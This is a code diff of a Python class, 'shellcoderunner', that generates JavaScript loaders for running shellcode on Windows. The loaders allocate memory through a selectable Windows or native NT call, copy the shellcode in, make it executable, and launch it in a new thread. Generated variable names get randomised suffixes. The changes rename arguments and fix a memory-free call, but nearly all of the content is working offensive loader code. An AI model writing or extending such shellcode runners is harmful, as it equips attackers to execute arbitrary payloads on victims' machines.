@@ -8,12 +8,12 @@ class shellcoderunner:
             if arguments['perm'] == 'rwx':
                 self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
 
-        self.allocation = 'VirtualAlloc'
-        if 'allocation' in arguments:
-            if arguments['allocation'] in ['VirtualAlloc', 'NtAllocateVirtualMemory', 'VirtualAllocEx', 'HeapAlloc']:
-                self.allocation = arguments['allocation']
+        self.allocate = 'VirtualAlloc'
+        if 'allocate' in arguments:
+            if arguments['allocate'] in ['VirtualAlloc', 'NtAllocateVirtualMemory', 'VirtualAllocEx', 'HeapAlloc']:
+                self.allocate = arguments['allocate']
             else:
-                print('Allocation argument must be VirtualAlloc, VirtualAllocEx, HeapAlloc, or NtAllocateVirtualMemory')
+                print('Allocate argument must be VirtualAlloc, VirtualAllocEx, HeapAlloc, or NtAllocateVirtualMemory')
                 exit(0)
 
         self.copy = 'memcpy'
@@ -32,12 +32,12 @@ class shellcoderunner:
                 print('Protect argument must be WaitForSingleObject or NtWaitForSingleObject')
                 exit(0)
 
-        self.execution = 'CreateThread'
-        if 'execution' in arguments:
-            if arguments['execution'] in ['CreateThread', 'NtCreateThreadEx']:
-                self.execution = arguments['execution']
+        self.execute = 'CreateThread'
+        if 'execute' in arguments:
+            if arguments['execute'] in ['CreateThread', 'NtCreateThreadEx']:
+                self.execute = arguments['execute']
             else:
-                print('Execution argument must be CreateThread or NtCreateThreadEx')
+                print('Execute argument must be CreateThread or NtCreateThreadEx')
                 exit(0)
 
         self.wait = 'WaitForSingleObject'
@@ -72,11 +72,11 @@ class shellcoderunner:
     {transformers}
 """
 
-        if self.allocation == 'VirtualAlloc':
+        if self.allocate == 'VirtualAlloc':
             template += """
     let address = {VirtualAlloc}(0, {shellcodeSize}, MemoryAllocationType.MEM_COMMIT | MemoryAllocationType.MEM_RESERVE, MemoryProtection.PAGE_READWRITE);
 """
-        elif self.allocation == 'NtAllocateVirtualMemory':
+        elif self.allocate == 'NtAllocateVirtualMemory':
             template += """
     let regionSize = new BigUint64Array(1);
     let baseAddress = new BigUint64Array(1);
@@ -84,11 +84,11 @@ class shellcoderunner:
     let status = {NtAllocateVirtualMemory}(-1n, ptr(baseAddress), 0n, ptr(regionSize), MemoryAllocationType.MEM_COMMIT | MemoryAllocationType.MEM_RESERVE, MemoryProtection.PAGE_READWRITE);
     let address = baseAddress[0];
 """
-        elif self.allocation == 'VirtualAllocEx':
+        elif self.allocate == 'VirtualAllocEx':
             template += """
     let address = {VirtualAllocEx}(-1n, 0, {shellcodeSize}n, MemoryAllocationType.MEM_COMMIT | MemoryAllocationType.MEM_RESERVE, MemoryProtection.PAGE_READWRITE);
 """
-        elif self.allocation == 'HeapAlloc':
+        elif self.allocate == 'HeapAlloc':
             template += """
     let hHeap = {HeapCreate}(0, {shellcodeSize}, 0);
     let address = {HeapAlloc}(hHeap, HeapAllocFlags.HEAP_ZERO_MEMORY, {shellcodeSize});  
@@ -124,11 +124,11 @@ class shellcoderunner:
     {NtProtectVirtualMemory}(-1n, ptr(baseAddress_$n), ptr(regionSize_$n), MemoryProtection.PAGE_EXECUTE_READ, ptr(oldProtect));
 """).substitute(n=os.urandom(4).hex())
 
-        if self.execution == 'CreateThread':
+        if self.execute == 'CreateThread':
             template += """
     let hThread = {CreateThread}(null, 0n, address, null, 0, null);
 """
-        elif self.execution == 'NtCreateThreadEx':
+        elif self.execute == 'NtCreateThreadEx':
             template += """
     let hThreadBuffer = new BigUint64Array(1); 
     {NtCreateThreadEx}(ptr(hThreadBuffer), ThreadAccessRights.THREAD_ALL_ACCESS, null, -1n, address, 0n, 0, 0n, 0n, 0n, null);
@@ -152,16 +152,16 @@ class shellcoderunner:
     {NtClose}(hThread);
 """
 
-        if self.allocation == 'VirtualAlloc':
+        if self.allocate == 'VirtualAlloc':
             template += """
-    {VirtualFree}(address);
+    {VirtualFree}(address, 0, MemoryAllocationType.MEM_RELEASE) ;
 """
-        elif self.allocation == 'HeapAlloc':
+        elif self.allocate == 'HeapAlloc':
             template += """
     {HeapFree}(hHeap, 0, address);
     {HeapDestroy}(hHeap);
 """
-        elif self.allocation == 'NtAllocateVirtualMemory':
+        elif self.allocate == 'NtAllocateVirtualMemory':
             template += """
     {NtFreeVirtualMemory}(-1n, address);
 """
